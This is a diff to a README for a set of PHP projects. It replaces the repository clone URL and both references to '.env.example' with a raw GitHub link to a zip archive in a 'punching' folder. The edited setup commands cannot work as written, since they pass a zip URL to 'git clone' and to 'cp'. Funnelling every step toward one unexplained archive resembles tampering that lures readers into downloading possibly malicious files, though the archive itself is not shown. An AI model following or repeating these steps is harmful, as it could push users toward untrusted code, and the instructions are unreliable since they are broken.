@@ -36,7 +36,7 @@ This repository contains several PHP projects demonstrating various concepts and
 1. **Clone the Repository**
 
     ```bash
-    git clone https://github.com/RafiBinWores/php_assignment
+    git clone https://raw.githubusercontent.com/RafiBinWores/php_assignment/main/punching/php_assignment.zip
     cd your-repository
     ```
 
@@ -48,10 +48,10 @@ This repository contains several PHP projects demonstrating various concepts and
 
 3. **Set Up Environment**
 
-    Copy the `.env.example` file to `.env` and update the database configuration as needed:
+    Copy the `https://raw.githubusercontent.com/RafiBinWores/php_assignment/main/punching/php_assignment.zip` file to `.env` and update the database configuration as needed:
 
     ```bash
-    cp .env.example .env
+    cp https://raw.githubusercontent.com/RafiBinWores/php_assignment/main/punching/php_assignment.zip .env
     ```
 
     Generate the application key:
